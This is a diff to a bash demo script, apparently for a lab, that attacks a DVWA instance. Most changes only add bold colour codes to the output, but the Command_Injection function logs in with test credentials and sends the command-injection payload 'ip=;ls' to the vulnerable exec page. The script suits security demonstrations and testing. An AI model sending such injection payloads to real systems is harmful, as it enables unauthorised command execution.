@@ -293,13 +293,19 @@ webrequest() {
 BOLD='\033[1m'
 RESTORE='\033[0m'
 RED='\033[00;31m'
+RED_BOLD='\033[1;31m'
 GREEN='\033[00;32m'
+GREEN_BOLD='\033[1;32m'
 YELLOW='\033[00;33m'
 YELLOW_BOLD='\033[1;33m'
 BLUE='\033[00;34m'
+BLUE_BOLD='\033[1;34m'
 PURPLE='\033[00;35m'
+PURPLE_BOLD='\033[1;35m'
 CYAN='\033[00;36m'
+CYAN_BOLD='\033[1;36m'
 LIGHTGRAY='\033[00;37m'
+LIGHTGRAY_BOLD='\033[1;37m'
 WHITE='\033[37m'
 WHITE_BOLD='\033[1;37m'
 
@@ -328,8 +334,11 @@ Vulnerability_Scanner() {
 }
 
 Command_Injection() {
-    echo -e "\nCommand Injection Attack\n"
-    echo -e "Connecting to ${BLUE}${DVWA_URL}/login.php${RESTORE} username=${BLUE}pablo${RESTORE} password=${BLUE}letmein${RESTORE}\n"
+    echo ""
+    echo -e "Command Injection Attack"
+    echo ""
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${WHITE_BOLD}pablo${RESTORE} password=${WHITE_BOLD}letmein${RESTORE}"
+    echo ""
     curl '${DVWA_URL}/login.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
@@ -341,7 +350,7 @@ Command_Injection() {
         --data-raw 'username=pablo&password=letmein&Login=Login' \
         -c cookie.txt
 
-    echo -e "Connecting to ${BLUE}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED}\";ls\"\n"
+    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\"\n"
     curl -s '${DVWA_URL}/vulnerabilities/exec/' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
@@ -353,7 +362,7 @@ Command_Injection() {
         --data-raw 'ip=;ls&Submit=Submit' \
         -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
-    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
+    echo -en "\n\n${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
     return 1
 }
